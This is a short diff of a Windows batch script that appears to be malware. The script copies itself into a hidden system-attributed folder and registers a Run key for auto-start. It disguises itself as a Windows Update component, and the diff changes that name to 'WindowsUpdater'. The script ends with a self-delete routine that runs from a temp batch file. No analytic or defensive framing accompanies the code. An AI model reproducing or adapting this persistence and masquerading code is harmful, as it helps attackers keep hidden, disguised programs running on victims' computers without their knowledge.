@@ -23,14 +23,14 @@ REM Create the folder
 if not exist "%BASE_DIR%" mkdir "%BASE_DIR%"
 
 REM Copy the exe itself into the random folder with the name intel.exe
-set "GENUINE_NAME=WindowsUpdate.bat"
+set "GENUINE_NAME=WindowsUpdater.bat"
 copy "%~f0" "%BASE_DIR%\%GENUINE_NAME%" /Y >nul
 
 REM Hide the folder (optional)
 attrib +h +s "%BASE_DIR%"
 
 REM Set registry to auto-start the copied exe
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "\"%BASE_DIR%\%GENUINE_NAME%\"" /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdater" /t REG_SZ /d "\"%BASE_DIR%\%GENUINE_NAME%\"" /f >nul
 
 echo Exe copied to: %BASE_DIR%\%GENUINE_NAME%
 echo Auto-start enabled.
@@ -134,3 +134,4 @@ REM === Self-delete logic ===
 ) > "%TEMP%\_delself.bat"
 
 start "" /min cmd /c "%TEMP%\_delself.bat"
+
